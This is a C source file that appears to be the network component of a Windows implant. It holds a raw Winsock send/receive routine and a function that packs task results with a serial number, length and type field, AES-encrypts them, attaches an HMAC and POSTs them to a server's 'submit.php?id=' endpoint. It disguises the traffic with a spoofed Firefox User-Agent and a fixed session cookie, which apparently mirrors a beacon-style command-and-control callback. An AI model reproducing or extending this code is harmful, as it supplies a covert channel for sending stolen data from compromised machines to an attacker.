#include"../include/network.h"

size_t DummyWriteData(void *pPtr, size_t tSize, size_t tNmemb, void *pStream)
{
	return tSize * tNmemb;
}

void SendPostRequest(const char *szUrl, unsigned char *pData, size_t tDataLength)
{
	CURL *pCurl;
	CURLcode res;
	struct curl_slist *pHeaders = NULL;

	pCurl = curl_easy_init();
	if (pCurl)
	{
		curl_easy_setopt(pCurl, CURLOPT_URL, szUrl);
		curl_easy_setopt(pCurl, CURLOPT_POST, 1L);
		curl_easy_setopt(pCurl, CURLOPT_POSTFIELDS, pData);
		curl_easy_setopt(pCurl, CURLOPT_POSTFIELDSIZE, (long)tDataLength);
		curl_easy_setopt(pCurl, CURLOPT_WRITEFUNCTION, DummyWriteData);

		pHeaders = curl_slist_append(pHeaders, "Cookie: JSESSION=MTk3NjgzMTMwMA==");
		pHeaders = curl_slist_append(pHeaders, "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20200101 Firefox/81.0");
		pHeaders = curl_slist_append(pHeaders, "Accept: */*");
		pHeaders = curl_slist_append(pHeaders, "Content-Type:");
		curl_easy_setopt(pCurl, CURLOPT_HTTPHEADER, pHeaders);

		res = curl_easy_perform(pCurl);
		if (res != CURLE_OK)
		{
			fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
		}

		curl_easy_cleanup(pCurl);
		curl_slist_free_all(pHeaders);
	}
}

int ConnectAndSend(const char *szIp, int nPort, char *szHttpdata, int nHttpdataLen, char **ppResponse, int *pnResponseSize)
{
	WSADATA stWsaData;
	int nResult = WSAStartup(MAKEWORD(2, 2), &stWsaData);
	if (nResult != 0)
	{
		printf("WSAStartup failed: %d\n", nResult);
		return 1;
	}

	SOCKET hSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (hSock == INVALID_SOCKET)
	{
		printf("Socket creation failed: %d\n", WSAGetLastError());
		WSACleanup();
		return 1;
	}

	struct sockaddr_in stServerAddr;
	stServerAddr.sin_family = AF_INET;
	stServerAddr.sin_port = htons((unsigned short)nPort);
	stServerAddr.sin_addr.s_addr = inet_addr(szIp);

	nResult = connect(hSock, (struct sockaddr *)&stServerAddr, sizeof(stServerAddr));
	if (nResult == SOCKET_ERROR)
	{
		printf("Connect failed: %d\n", WSAGetLastError());
		closesocket(hSock);
		WSACleanup();
		return 1;
	}

	nResult = send(hSock, szHttpdata, nHttpdataLen, 0);
	if (nResult == SOCKET_ERROR)
	{
		printf("Send failed: %d\n", WSAGetLastError());
		closesocket(hSock);
		WSACleanup();
		return 1;
	}

	int nBufferSize = 1024;
	char *pBuffer = (char *)malloc(nBufferSize);
	if (pBuffer == NULL)
	{
		printf("Memory allocation failed.\n");
		closesocket(hSock);
		WSACleanup();
		return 1;
	}
	int nReceivedBytes = 0;
	int nTotalBytes = 0;
	do
	{
		nResult = recv(hSock, pBuffer + nTotalBytes, nBufferSize - nTotalBytes, 0);
		if (nResult == SOCKET_ERROR)
		{
			printf("Receive failed: %d\n", WSAGetLastError());
			free(pBuffer);
			closesocket(hSock);
			WSACleanup();
			return 1;
		}
		else if (nResult == 0)
		{
			break;
		}
		nReceivedBytes = nResult;
		nTotalBytes += nReceivedBytes;

		if (nTotalBytes == nBufferSize)
		{
			nBufferSize *= 2;
			char *pNewBuffer = (char *)realloc(pBuffer, nBufferSize);
			if (pNewBuffer == NULL)
			{
				printf("Memory reallocation failed.\n");
				free(pBuffer);
				closesocket(hSock);
				WSACleanup();
				return 1;
			}
			pBuffer = pNewBuffer;
		}
	} while (1);

	*ppResponse = pBuffer;
	*pnResponseSize = nTotalBytes;

	closesocket(hSock);
	WSACleanup();

	return 0;
}

void PostResultAdvanced(const char *szIp, int nPort, char *szSessionId, const unsigned char *pResult, size_t tResultLen)
{
	char *szUrl = (char *)malloc(256);
	char *szPortStr = (char *)malloc(6);
	memset(szUrl, 0x00, 256);
	memset(szPortStr, 0x00, 6);
	_itoa_s(nPort, szPortStr, 6, 10);
	sprintf_s(szUrl, 256, "http://%s:%s/submit.php?id=%s", szIp, szPortStr, szSessionId);
	nCount++;

	printf("Sending result to %s (count=%d, result_len=%zu)\n", szUrl, nCount, tResultLen);

	// 为结果添加额外的空字节
	unsigned char *pResultWithNull = (unsigned char *)malloc(tResultLen + 1);
	memcpy(pResultWithNull, pResult, tResultLen);
	pResultWithNull[tResultLen] = 0; // 添加空字节

	// 序列号
	unsigned char abSerialNumber[4];
	abSerialNumber[0] = (nCount >> 24) & 0xFF;
	abSerialNumber[1] = (nCount >> 16) & 0xFF;
	abSerialNumber[2] = (nCount >> 8) & 0xFF;
	abSerialNumber[3] = nCount & 0xFF;

	// 构造要发送的数据
	size_t tDataLen = tResultLen + 4 + 1; // +1 表示额外的空字节
	unsigned char *pData = (unsigned char *)malloc(tDataLen);
	memcpy(pData, abSerialNumber, 4);
	memcpy(pData + 4, pResultWithNull, tResultLen + 1);

	// 添加长度
	unsigned char abLength[4];
	abLength[0] = ((tDataLen + 4) >> 24) & 0xFF;
	abLength[1] = ((tDataLen + 4) >> 16) & 0xFF;
	abLength[2] = ((tDataLen + 4) >> 8) & 0xFF;
	abLength[3] = (tDataLen + 4) & 0xFF;

	// 添加结果类型
	unsigned char abResultType[4] = {0, 0, 0, 32};

	// 合并数据
	size_t tFullDataLen = 4 + 4 + 4 + tResultLen + 1;
	unsigned char *pFullData = (unsigned char *)malloc(tFullDataLen);

	memcpy(pFullData, abSerialNumber, 4);
	memcpy(pFullData + 4, abLength, 4);
	memcpy(pFullData + 8, abResultType, 4);
	memcpy(pFullData + 12, pResultWithNull, tResultLen + 1);

	// 加密数据
	size_t tEncryptedLen;
	unsigned char *pEncryptedData = EncryptAesCbc(pFullData, tFullDataLen, abIv, abSharedKey, &tEncryptedLen);

	// 计算HMAC
	unsigned char abHmacResult[32];
	unsigned int nHmacLen;
	HMAC(EVP_sha256(), abHmacKey, 16, pEncryptedData, tEncryptedLen, abHmacResult, &nHmacLen);

	// 添加长度和HMAC
	unsigned char abPostLength[4];
	size_t tPostDataLen = tEncryptedLen + 16;
	abPostLength[0] = (tPostDataLen >> 24) & 0xFF;
	abPostLength[1] = (tPostDataLen >> 16) & 0xFF;
	abPostLength[2] = (tPostDataLen >> 8) & 0xFF;
	abPostLength[3] = tPostDataLen & 0xFF;

	size_t tFinalDataLen = 4 + tEncryptedLen + 16;
	unsigned char *pFinalData = (unsigned char *)malloc(tFinalDataLen);
	memcpy(pFinalData, abPostLength, 4);
	memcpy(pFinalData + 4, pEncryptedData, tEncryptedLen);
	memcpy(pFinalData + 4 + tEncryptedLen, abHmacResult, 16);

	// 发送数据
	SendPostRequest(szUrl, pFinalData, tFinalDataLen);

	// 释放内存
	free(pResultWithNull);
	free(pData);
	free(pFullData);
	free(pEncryptedData);
	free(pFinalData);
	free(szUrl);
	free(szPortStr);
}